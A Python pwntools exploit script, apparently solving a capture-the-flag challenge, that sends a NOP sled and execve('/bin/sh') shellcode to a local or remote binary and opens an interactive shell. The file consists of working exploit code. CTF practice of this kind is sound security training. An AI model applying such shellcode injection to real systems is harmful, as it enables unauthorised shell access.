#!usr/bin/env python
#coding=utf-8
from pwn import *
from ctypes import CDLL

context(arch = 'amd64',os = 'linux',log_level = 'debug')
elf = ELF('./pwn')
DEBUG = 1
if DEBUG:
    gdbOpen = 0
    clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')
else:
    gdbOpen = 0
    ip = 'node.yuzhian.com.cn'
    port = 38867
    p = remote(ip, port)
    clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')


def debug(info="b main"):
    if gdbOpen == 1:
        gdb.attach(p, info)
        #gdb.attach(p, "b *$rebase(0x)")

debug("b *0x00000000004012F1")
shellcode = asm(shellcraft.execve('/bin/sh'))
p.sendafter(b'min!',b'\x90'*0x70+shellcode)

p.interactive()
